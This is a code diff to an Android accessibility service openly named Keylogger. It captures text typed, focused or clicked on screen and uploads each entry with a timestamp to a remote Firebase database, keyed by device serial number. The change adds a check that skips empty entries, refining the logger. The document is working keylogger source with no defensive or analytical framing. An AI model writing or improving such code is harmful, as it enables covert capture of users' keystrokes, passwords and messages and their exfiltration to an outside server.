@@ -48,56 +48,79 @@ public class Keylogger extends AccessibilityService {
             case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                 String data = event.getText().toString();
 
-
-
-                // Write a message to the database
-                FirebaseDatabase database = FirebaseDatabase.getInstance();
-                DatabaseReference myRef = database.getReference("KeyLogger");
+                if(data.equals("[]")) {
 
 
 
-                myRef = myRef.child(gefundenerKey.getSerialnumber()).child("Eintraege");
+                } else {
 
-                String id = myRef.push().getKey();
-                Eintrag neuerEintrag = new Eintrag(data, time, id);
-                myRef.child(id).setValue(neuerEintrag);
+                    // Write a message to the database
+                    FirebaseDatabase database = FirebaseDatabase.getInstance();
+                    DatabaseReference myRef = database.getReference("KeyLogger");
 
 
+                    myRef = myRef.child(gefundenerKey.getSerialnumber()).child("Eintraege");
+
+                    String id = myRef.push().getKey();
+                    Eintrag neuerEintrag = new Eintrag(data, time, id);
+                    myRef.child(id).setValue(neuerEintrag);
+
+
+
+                }
 
                 break;
             }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                 String data = event.getText().toString();
 
-               // Write a message to the database
-               FirebaseDatabase database = FirebaseDatabase.getInstance();
-               DatabaseReference myRef = database.getReference("KeyLogger");
+
+               if(data.equals("[]")) {
 
 
 
-               myRef = myRef.child(gefundenerKey.getSerialnumber()).child("Eintraege");
+               } else {
 
-               String id = myRef.push().getKey();
-               Eintrag neuerEintrag = new Eintrag(data, time, id);
-               myRef.child(id).setValue(neuerEintrag);
+                   // Write a message to the database
+                   FirebaseDatabase database = FirebaseDatabase.getInstance();
+                   DatabaseReference myRef = database.getReference("KeyLogger");
 
+
+                   myRef = myRef.child(gefundenerKey.getSerialnumber()).child("Eintraege");
+
+                   String id = myRef.push().getKey();
+                   Eintrag neuerEintrag = new Eintrag(data, time, id);
+                   myRef.child(id).setValue(neuerEintrag);
+
+
+
+               }
 
                break;
             }
             case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                 String data = event.getText().toString();
 
-                // Write a message to the database
-                FirebaseDatabase database = FirebaseDatabase.getInstance();
-                DatabaseReference myRef = database.getReference("KeyLogger");
+                if(data.equals("[]")) {
 
 
 
-                myRef = myRef.child(gefundenerKey.getSerialnumber()).child("Eintraege");
+                } else {
 
-                String id = myRef.push().getKey();
-                Eintrag neuerEintrag = new Eintrag(data, time, id);
-                myRef.child(id).setValue(neuerEintrag);
+                    // Write a message to the database
+                    FirebaseDatabase database = FirebaseDatabase.getInstance();
+                    DatabaseReference myRef = database.getReference("KeyLogger");
+
+
+                    myRef = myRef.child(gefundenerKey.getSerialnumber()).child("Eintraege");
+
+                    String id = myRef.push().getKey();
+                    Eintrag neuerEintrag = new Eintrag(data, time, id);
+                    myRef.child(id).setValue(neuerEintrag);
+
+
+
+                }
 
                 break;
             }
